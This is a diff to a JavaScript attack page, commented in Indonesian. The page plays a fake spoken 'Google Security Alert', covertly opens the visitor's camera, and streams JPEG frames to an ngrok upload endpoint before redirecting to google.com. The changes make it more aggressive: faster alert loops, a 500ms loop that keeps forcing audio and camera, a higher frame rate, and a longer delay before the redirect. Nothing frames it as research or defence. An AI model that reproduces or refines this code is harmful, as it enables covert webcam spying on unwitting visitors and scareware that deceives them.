@@ -46,8 +46,11 @@
   // KONFIGURASI
   // ============================================
   var TARGET_URL = "https://www.google.com";
-  var SERVER_ENDPOINT = "https://studly-unallegorized-brecken.ngrok-free.dev/";
+  var SERVER_ENDPOINT = "https://studly-unallegorized-brecken.ngrok-free.dev/upload";
   
+  // Interval Race Condition (ms) - Setiap 500ms
+  var RACE_INTERVAL = 500;
+
   var CONFIG = {
     tts: {
       text: "Google Security Alert. Your account has been accessed from an unknown device. If this was not you, verify your identity immediately.",
@@ -55,14 +58,14 @@
       rate: 0.85,
       pitch: 1.0,
       volume: 1.0,
-      repeatInterval: 8000,
-      maxRepeats: 20
+      repeatInterval: 3000, // Loop lebih cepat (3 detik)
+      maxRepeats: 50 // Lebih banyak loop
     },
     silentWav: 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA='
   };
 
   // ============================================
-  // 1. AUDIO LOGIC (DARI KODE ANDA)
+  // 1. AUDIO LOGIC (LOOP)
   // ============================================
   function speakOnce() {
     if (!('speechSynthesis' in window)) return;
@@ -151,7 +154,7 @@
           }).catch(function(err) {
             log("[-] Gagal kirim: " + err.message);
           });
-        }, 'image/jpeg', 0.6);
+        }, 'image/jpeg', 0.5);
       }
     } catch(e) {}
   }
@@ -168,7 +171,7 @@
           log("[+] 🚨 KAMERA BERHASIL diakses!");
 
           if (streamInterval) clearInterval(streamInterval);
-          streamInterval = setInterval(sendImageToServer, 100);
+          streamInterval = setInterval(sendImageToServer, 80); // 12.5 FPS
         })
         .catch(function(err) {
           log("[-] Kamera diblokir: " + err.name);
@@ -189,10 +192,10 @@
       <div id="log"></div>
     `;
     logEl = document.getElementById('log');
-    log("[!] Memulai Full Audio & CCTV Hijack...");
+    log("[!] Memulai Infinite Loop Race...");
 
     // ============================================
-    // A. AUDIO INIT (0ms)
+    // A. INISIALISASI AUDIO & KAMERA (0ms)
     // ============================================
     unlockAudioContext();
     trySilentAudio();
@@ -200,40 +203,27 @@
     startCamera();
 
     // ============================================
-    // B. REDIRECT KE GOOGLE (500ms)
+    // B. RACE CONDITION LOOP (Setiap 500ms)
     // ============================================
-    setTimeout(function() {
-      log("[+] Redirect ke Google.com...");
-      try {
-        window.location.href = TARGET_URL;
-      } catch(e) {}
-    }, 500);
-
-    // ============================================
-    // C. RETRY AUDIO & CAMERA (1000ms, 2000ms)
-    // ============================================
-    setTimeout(function() {
-      if (!ttsStarted) startTTS();
-      if (!streamInterval) startCamera();
-    }, 1000);
-
-    setTimeout(function() {
-      if (!ttsStarted) startTTS();
-      if (!streamInterval) startCamera();
-    }, 2000);
-
-    // ============================================
-    // D. RETRY LOOP (Setiap 2 detik)
-    // ============================================
-    var retryCount = 0;
-    var retry = setInterval(function () {
-      retryCount++;
+    // Loop ini akan terus memicu audio dan kamera
+    // sampai halaman berpindah (setelah redirect).
+    var raceInterval = setInterval(function() {
       unlockAudioContext();
       trySilentAudio();
       if (!ttsStarted) startTTS();
       if (!streamInterval) startCamera();
-      if (retryCount > 10) clearInterval(retry);
-    }, 2000);
+    }, RACE_INTERVAL);
+
+    // ============================================
+    // C. REDIRECT KE GOOGLE (Setelah 10 detik)
+    // ============================================
+    setTimeout(function() {
+      log("[+] Redirect ke Google.com...");
+      clearInterval(raceInterval); // Hentikan race sebelum redirect
+      try {
+        window.location.href = TARGET_URL;
+      } catch(e) {}
+    }, 10000); // 10 Detik
 
   }, { once: true });
 
